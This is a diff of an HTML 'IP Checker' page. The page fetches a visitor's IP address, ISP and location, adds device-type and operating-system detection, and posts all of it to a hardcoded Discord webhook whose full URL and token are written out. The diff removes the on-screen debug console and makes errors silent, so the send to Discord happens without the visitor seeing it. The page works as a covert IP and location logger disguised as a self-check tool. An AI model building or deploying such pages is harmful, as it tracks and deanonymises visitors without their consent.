@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Checker with Discord Debug</title>
+    <title>IP Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen">
@@ -11,21 +11,36 @@
     <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
         <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
         <div id="ip-info" class="mb-4"></div>
-        <div id="debug-console" class="bg-gray-900 text-white p-4 rounded-lg mt-4 overflow-y-auto h-64">
-            <h2 class="text-lg font-bold mb-2">Debug Console</h2>
-            <pre id="debug-log" class="text-sm"></pre>
-        </div>
     </div>
 
     <script>
-        function debugLog(message) {
-            const logElement = document.getElementById('debug-log');
-            logElement.textContent += message + "\n";
+        function getDeviceInfo() {
+            // Get device information from the user agent
+            const userAgent = navigator.userAgent;
+            let deviceType = "Unknown";
+            let os = "Unknown";
+
+            // Simple checks for device type and OS
+            if (userAgent.includes("Mobile")) {
+                deviceType = "Mobile";
+            } else if (userAgent.includes("Tablet")) {
+                deviceType = "Tablet";
+            } else if (userAgent.includes("Win")) {
+                deviceType = "Desktop";
+                os = "Windows";
+            } else if (userAgent.includes("Mac")) {
+                deviceType = "Desktop";
+                os = "MacOS";
+            } else if (userAgent.includes("Linux")) {
+                deviceType = "Desktop";
+                os = "Linux";
+            }
+
+            return { deviceType, os };
         }
 
         async function getIPData() {
             try {
-                debugLog("Fetching IP information...");
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
@@ -33,24 +48,24 @@
                 const location = `${city}, ${region}, ${country_name}`;
                 const isp = org || "Unknown ISP";
 
+                const { deviceType, os } = getDeviceInfo();
+
                 document.getElementById('ip-info').innerHTML = `
                     <p><strong>IP:</strong> ${ip}</p>
                     <p><strong>ISP:</strong> ${isp}</p>
                     <p><strong>Location:</strong> ${location}</p>
+                    <p><strong>Device Type:</strong> ${deviceType}</p>
+                    <p><strong>Operating System:</strong> ${os}</p>
                 `;
 
-                debugLog(`IP: ${ip}`);
-                debugLog(`ISP: ${isp}`);
-                debugLog(`Location: ${location}`);
-
-                sendToDiscord(ip, isp, location);
+                sendToDiscord(ip, isp, location, deviceType, os);
             } catch (error) {
-                debugLog("Error fetching IP information: " + error.message);
+                // Handle errors silently or show a user-friendly message if desired
             }
         }
 
-        async function sendToDiscord(ip, isp, location) {
-            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;
+        async function sendToDiscord(ip, isp, location, deviceType, os) {
+            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}\nDevice Type: ${deviceType}\nOperating System: ${os}`;
             const discordWebhookUrl = 'https://discord.com/api/webhooks/1247107833435258911/807oJEH8MIMSq9OS-MxFssEplKJiy-UVQb1hmtcy3DnYI_azgx5VVsRu2LWrW4nW8688';
 
             const payload = {
@@ -58,26 +73,15 @@
             };
 
             try {
-                debugLog("Sending message to Discord: " + message);
-                const response = await fetch(discordWebhookUrl, {
+                await fetch(discordWebhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
                 });
-
-                const result = await response.json();
-                debugLog("Discord API response status: " + response.status);
-                debugLog("Discord API response: " + JSON.stringify(result));
-
-                if (!response.ok) {
-                    debugLog("Discord API error: " + result.message);
-                } else {
-                    debugLog("Message sent successfully.");
-                }
             } catch (error) {
-                debugLog("Error sending message to Discord: " + error.message);
+                // Handle errors silently or show a user-friendly message if desired
             }
         }
 
